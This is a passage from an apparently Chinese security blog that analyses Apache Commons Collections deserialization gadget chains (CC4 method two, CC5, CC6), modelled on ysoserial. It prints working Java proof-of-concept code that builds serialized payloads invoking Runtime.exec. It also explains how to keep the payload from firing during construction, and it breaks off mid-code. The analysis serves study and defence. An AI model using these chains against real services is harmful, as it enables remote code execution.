<p>因为我们只需要call到<code>chainedTransformer.transform()</code>方法，不需要像cc2链一样要向<code>InvokerTransformer</code>传数据，因此我们不需要在<code>queue</code>中添加构造的<code>templates</code>了。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4Method2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法的区别在于，我们不需要先伪装<code>transformers</code>里的各种<code>transformer</code>，相反，我们先创建一个不含自定义<code>comparator</code>的PriorityQueue，在add完之后，我们再将<code>comparator</code>加进这个<code>PriorityQueue</code>，这样就巧妙的绕过了<code>add()</code>触发点</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>cc4 = cc2和cc3的混合体</p>
<blockquote>
<p>Gadget chain:<br> ObjectInputStream.readObject()<br>     PriorityQueue.readObject()<br>       TransformingComparator()<br>         ChainedTransformer.transform()<br>             ConstantTransformer.transform()<br>                 InstantiateTransformer.transform()<br>                     TrAXFilter.TrAXFilter()<br>                         …<br>                             exec()</p>
</blockquote>
<h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/233393#h3-8">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.8</li>
</ul>
<h3 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><a href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer" class="headerlink" title="ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer"></a>ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</h4><p>在cc5后半部分，我们依然使用之前用过的利用链</p>
<blockquote>
<p>ChainedTransformer.transform()</p>
<p>​    ConstantTransformer.transform()</p>
<p>​        InvokerTransformer.transform()</p>
<p>​            Runtime.exec()</p>
</blockquote>
<p>在<code>commons-collections:3.1-3.2.1</code>中，我们的<code>InvokerTransformer</code>存在，所以可以继续利用它来作为我们利用链的一部分。</p>
<h4 id="LazyMap-1"><a href="#LazyMap-1" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>和cc1一样，我们选择使用**LazyMap.get()**来触发<code>ChainedTransformer.transform()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//此处会执行factory，我们将factory赋值为我们的chainedTrasnformer即可</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>LazyMap</code>的构造函数是<code>protected</code>的，我们可以用<code>LazyMap.decorate()</code>来得到我们想要的<code>LazyMap instance</code>，具体的在之前的cc1和cc3都有讲解过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们可以暂时写出如下payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在cc1中，我们有用到<code>AnnotationInvocationHandler</code>，但<code>AnnotationInvocationHandler</code>在JDK1.8做了限制，所以我们用到了<code>BadAttributeValueExpException</code></p>
<hr>
<p>写着一半发现不对劲，之前其实有写了cc5，写在cc1的地方重复了 LOL</p>
<p>剩下看<a href="#cc5">这里</a></p>
<hr>
<h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7&amp;1.8</li>
</ul>
<h3 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>在cc5中，我们使用<code>TiedMapEntry.toString()</code>来执行<code>TiedMap.getValue()</code>，再由<code>BadAttributeInvocationHandler</code>来执行<code>TiedMapEntry.toString()</code>，从而完成利用链的衔接。我们在cc6中，将另外寻找一条链，能够连接<code>TiedMapEntry.getValue()-&gt;Lazymap.get() -&gt; ChainedTransformer.transform()</code></p>
<h4 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a>TiedMapEntry.hashCode()</h4><p>我们发现，在<strong>hashCode()<strong>方法中也call到了</strong>getValue()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();<span class="comment">//这里也call到了同类下的getValue()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么什么能够执行<code>hashCode()</code>呢</p>
<h4 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h4><p>我们在<code>HashMap</code>下找到了<code>hash()</code>方法，其中call到了<code>hashCode()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();<span class="comment">//这里我们如果给k赋值为TiedMapEntry的instance就可以执行命令</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续找可以连接<code>hash()</code>的方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145232237.png" alt="image-20211204145232237"></p>
<p>我们发现这里有很多地方都用到了<code>hash()</code>，我们一个一个分析</p>
<h4 id="调用hash-处一（方法一）："><a href="#调用hash-处一（方法一）：" class="headerlink" title="调用hash()处一（方法一）："></a>调用hash()处一（方法一）：</h4><h5 id="HashMap-putForCreate-amp-HashMap-readObject"><a href="#HashMap-putForCreate-amp-HashMap-readObject" class="headerlink" title="HashMap.putForCreate() &amp; HashMap.readObject()"></a>HashMap.putForCreate() &amp; HashMap.readObject()</h5><p>最后我们找到putForCreate()，发现它调用了<code>hash()</code>且它<strong>会被readObject()调用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);<span class="comment">//如果key不为null,这里会调用hash(key)</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Look for preexisting entry for key.  This will never happen for</span></span><br><span class="line"><span class="comment">     * clone or deserialize.  It will only happen for construction if the</span></span><br><span class="line"><span class="comment">     * input Map is a sorted map whose ordering is inconsistent w/ equals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">            e.value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createEntry(hash, key, value, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145642205.png" alt="image-20211204145642205"></p>
<p>那么我们就可以确定使用这个链了</p>
<blockquote>
<p>HashMap.readObject([key,value])-&gt;HashMap.putForCreate(key,value)-&gt;HashMap.hash(key)-&gt;key.hashcode()-&gt;TiedMapEntrykey.hashCode()-&gt;TiedMapEntry.getValue(this.key=chainedTransformer)-&gt;Lazymap.get(chainedTransformer) -&gt; ChainedTransformer.transform() -&gt; …..</p>
</blockquote>
<p>我们尝试来构造一下<strong>POC</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);</span></span><br><span class="line"><span class="comment">//        objectInputStream.readObject();//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>奇怪的是，我们并没有反序列化，但计算器依然弹出来了，说明这里某处又触发了一次命令执行。</p>
<h5 id="HashMap-put-的问题"><a href="#HashMap-put-的问题" class="headerlink" title="HashMap.put()的问题"></a>HashMap.put()的问题</h5><p>还记得我们之前查找哪些地方调用了HashMap.hash()吗，那里貌似出现了很多地方调用。其中一个地方 <code>put()</code>方法里，也对<code>hash()</code>进行了调用，<strong>正好我们要在生成payload的时候put进key-value对</strong>，那该怎样才能让他在生成payload的时候不触发？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);<span class="comment">//这里也调用了hash，导致后面漏洞触发了。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;<span class="comment">//把key-value放入Entry&lt;K,V&gt;</span></span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>其实刚开始分析的时候总觉得这一幕似曾相识，感觉好像自己之前分析过<code>put</code>重复执行命令的这种类似的情况。后来去网上查了下，发现这不是<strong>URLDNS</strong>的内容吗？</p>
<p>因为触发的地方在<code>LazyMap.get() -&gt; ChainedTransformer.transform()</code></p>
<p>所以我们可以在构造LazyMap的时候让他执行一个无效的ChainedTransformer,然后最后再传入真正有用的<code>transformer</code></p>
<p><strong>POC如下：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写一个fake的trasnformers</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title 